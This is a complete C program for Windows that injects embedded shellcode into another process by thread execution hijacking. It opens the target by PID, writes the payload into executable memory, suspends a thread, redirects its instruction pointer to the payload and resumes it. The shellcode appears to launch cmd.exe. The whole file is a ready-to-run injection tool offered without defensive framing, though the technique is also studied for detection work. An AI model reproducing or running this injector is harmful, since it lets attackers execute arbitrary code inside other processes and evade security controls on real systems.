#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>


#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__);
#define fail(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__);
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__);

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
	info("ThreadProc() called");
	return 0;
}

BOOL ThreadExecutionHijacking(int target_PID)
{
	THREADENTRY32 threadEntry;
	HANDLE hThreadHijacked = NULL;
	CONTEXT context;

	/* open target process */
	info("Opening target process with PID: %d", target_PID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_PID);
	if (hProcess == NULL)
	{
		fail("OpenProcess() failed");
		return FALSE;
	}
	okay("Target process opened successfully");

	/* allocate buffer in target process */
	info("Allocating buffer in target process");
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		fail("VirtualAllocEx() failed");
		return FALSE;
	}
	okay("Buffer allocated successfully");

	/* find thread id of the thread we went to hijack in the process */
	/* open handle to the thread to be hijacking */
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	info("Finding thread ID of the thread to be hijacked");
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, target_PID);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		fail("CreateToolhelp32Snapshot() failed");
		return FALSE;
	}

	info("Opening handle to the thread to be hijacked");
	Thread32First(hSnapshot, &threadEntry);
	while (Thread32Next(hSnapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == target_PID)
		{
			hThreadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			if (hThreadHijacked == NULL)
			{
				fail("OpenThread() failed");
				return FALSE;
			}
			okay("Thread opened successfully");
			break;
		}
	}
	if (hThreadHijacked == NULL)
	{
		fail("Failed to open handle to the thread to be hijacked");
		return FALSE;
	}
	okay("Thread opened successfully");

	/* suspend the target thread */
	info("Suspending the target thread");
	if (SuspendThread(hThreadHijacked) == -1)
	{
		fail("SuspendThread() failed");
		return FALSE;
	}
	okay("Thread suspended successfully");

	/* retrieve the target thread's context */
	info("Retrieving the target thread's context");
	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThreadHijacked, &context))
	{
		fail("GetThreadContext() failed");
		return FALSE;
	}
	okay("Context retrieved successfully");

	/* update the target thread's context to execute our shellcode */
	info("Updating the target thread's context to execute our shellcode");
#ifndef _WIN64
	context.Eip = (DWORD_PTR)lpBaseAddress;
#else
	context.Rip = (DWORD_PTR)lpBaseAddress;
#endif
	if (!WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL))
	{
		fail("WriteProcessMemory() failed");
		return FALSE;
	}
	if (!SetThreadContext(hThreadHijacked, &context))
	{
		fail("SetThreadContext() failed");
		return FALSE;
	}
	okay("Context updated successfully");

	/* resume the target thread */
	info("Resuming the target thread");
	if (ResumeThread(hThreadHijacked) == -1)
	{
		fail("ResumeThread() failed");
		return FALSE;
	}
	okay("Thread resumed successfully");

	/* cleanup */
	CloseHandle(hThreadHijacked);
	CloseHandle(hProcess);
	if (hSnapshot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapshot);

	return TRUE;

}

int main(int argc, char** argv)
{
	if (argc < 2)
	{
		fail("Usage: %s <TARGET PID>", argv[0]);
		return EXIT_FAILURE;
	}

	int target_PID = atoi(argv[1]);

	if (!ThreadExecutionHijacking(target_PID))
	{
		fail("ThreadExecutionHijacking() failed");
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}
